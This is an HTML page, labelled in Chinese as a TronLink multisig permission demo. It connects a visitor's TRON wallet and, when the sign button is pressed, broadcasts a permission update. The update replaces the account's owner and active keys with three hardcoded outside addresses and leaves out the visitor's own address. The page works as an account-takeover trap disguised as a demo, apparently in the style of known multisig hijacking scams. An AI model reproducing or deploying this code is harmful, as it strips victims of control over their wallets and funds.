<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>TronLink 多签权限签名演示</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
</head>
<body>
  <h1>🔐 使用 TronLink 进行多签权限更新</h1>
  <button id="connectBtn">连接 TronLink 钱包</button>
  <p id="walletAddress"></p>
  <button id="signBtn" disabled>签名并广播权限更新交易</button>
  <pre id="result"></pre>
  <script>
    const connectBtn = document.getElementById('connectBtn');
    const signBtn = document.getElementById('signBtn');
    const walletAddress = document.getElementById('walletAddress');
    const resultBox = document.getElementById('result');
    let tronWeb = null;
    connectBtn.onclick = async () => {
      if (window.tronLink) {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        tronWeb = window.tronWeb;
        const address = tronWeb.defaultAddress.base58;
        walletAddress.innerText = '当前地址: ' + address;
        signBtn.disabled = false;
      } else {
        alert('请先安装 TronLink 插件');
      }
    };
    signBtn.onclick = async () => {
      const permissionUpdate = {
        owner: {
          permission_name: "owner",
          threshold: 2,
          keys: [
            { address: "TCUF8G5VLJedxck3hy2s4okmw3VNchbZ9a", weight: 1 },
            { address: "TCYBsw5hW76p5mMfuSYP9qwnoidCo7yCx4", weight: 1 },
            { address: "TVGxYdjS15dKPg6HRq6ARavgTfLbQxfVpy", weight: 1 }
          ]
        },
        actives: [
          {
            type: "Active",
            id: 2,
            permission_name: "active",
            threshold: 2,
            operations: "7fff1fc0033ec30f000000000000000000000000000000000000000000000000",
            keys: [
              { address: "TCUF8G5VLJedxck3hy2s4okmw3VNchbZ9a", weight: 1 },
              { address: "TCYBsw5hW76p5mMfuSYP9qwnoidCo7yCx4", weight: 1 },
              { address: "TVGxYdjS15dKPg6HRq6ARavgTfLbQxfVpy", weight: 1 }
            ]
          }
        ]
      };
      try {
        const tx = await tronWeb.transactionBuilder.updateAccountPermissions(permissionUpdate, tronWeb.defaultAddress.base58);
        const signedTx = await tronWeb.trx.sign(tx);
        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
        resultBox.innerText = JSON.stringify(receipt, null, 2);
      } catch (err) {
        resultBox.innerText = '错误: ' + err.message;
      }
    };
  </script>
</body>
</html>
